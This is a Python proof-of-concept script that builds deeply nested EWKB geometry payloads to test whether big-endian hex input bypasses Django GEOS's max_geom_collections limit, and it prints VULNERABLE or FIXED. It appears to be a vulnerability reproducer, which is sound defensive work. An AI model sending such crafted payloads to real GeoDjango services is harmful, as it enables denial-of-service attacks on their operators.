import struct
import sys

from django.conf import settings

if not settings.configured:
    settings.configure(SECRET_KEY="test", INSTALLED_APPS=[])

import django
django.setup()

from django.contrib.gis.geos import GEOSGeometry


def layer(endian, type_code, srid, count=1):
    marker = b"\x01" if endian == "<" else b"\x00"
    return (
        marker
        + struct.pack(f"{endian}I", type_code)
        + struct.pack(f"{endian}I", srid)
        + struct.pack(f"{endian}I", count)
    )


def point(endian, type_code, srid):
    marker = b"\x01" if endian == "<" else b"\x00"
    return (
        marker
        + struct.pack(f"{endian}I", type_code)
        + struct.pack(f"{endian}I", srid)
        + struct.pack(f"{endian}dd", 0.0, 0.0)
    )


def nested_ewkb(endian, depth, srid=0x11111111):
    # EWKB SRID flag + GeometryCollection / Point.
    collection_type = 0x20000007
    point_type = 0x20000001
    return layer(endian, collection_type, srid) * depth + point(
        endian, point_type, srid
    )


def is_blocked(payload, limit):
    try:
        geom = GEOSGeometry(payload, max_geom_collections=limit)
    except ValueError as exc:
        return True, type(exc).__name__, str(exc)
    except Exception as exc:
        return False, type(exc).__name__, str(exc)
    else:
        return False, geom.geom_type, f"srid={geom.srid}"


limit = 5
depth = 6

le = nested_ewkb("<", depth)
be = nested_ewkb(">", depth)

cases = [
    ("little-endian hex str", le.hex().upper()),
    ("big-endian binary memoryview", memoryview(be)),
    ("big-endian hex str", be.hex().upper()),
    ("big-endian hex bytes", be.hex().encode("ascii")),
]

results = {}
for name, payload in cases:
    blocked, kind, detail = is_blocked(payload, limit)
    results[name] = blocked
    print(f"{name}: blocked={blocked} result={kind} detail={detail}")

# Controls: both little-endian hex and big-endian binary must be rejected.
assert results["little-endian hex str"] is True, "little-endian control was not limited"
assert results["big-endian binary memoryview"] is True, "binary big-endian control was not limited"

# Candidate: the same big-endian EWKB encoded as hex must also be rejected.
# Current vulnerable code byte-swaps unconditionally in limit_hex(), so it
# doesn't count these valid GeometryCollection headers.
if results["big-endian hex str"] or results["big-endian hex bytes"]:
    print("FIXED: big-endian hex EWKB was limited")
    sys.exit(2)

print("VULNERABLE: big-endian hex EWKB bypassed max_geom_collections")
